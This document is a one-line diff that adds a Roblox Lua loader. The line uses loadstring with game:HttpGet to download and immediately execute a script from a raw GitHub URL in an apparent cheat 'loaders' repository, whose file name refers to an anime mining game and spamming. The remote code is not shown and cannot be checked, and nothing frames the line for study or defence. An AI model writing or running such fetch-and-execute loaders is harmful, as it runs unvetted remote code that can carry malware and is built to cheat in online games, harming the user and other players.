@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Unitetrumake/loaders/main/loaders/my-anime-mine-spam6-kqmi23pvjr1xey.lua"))()
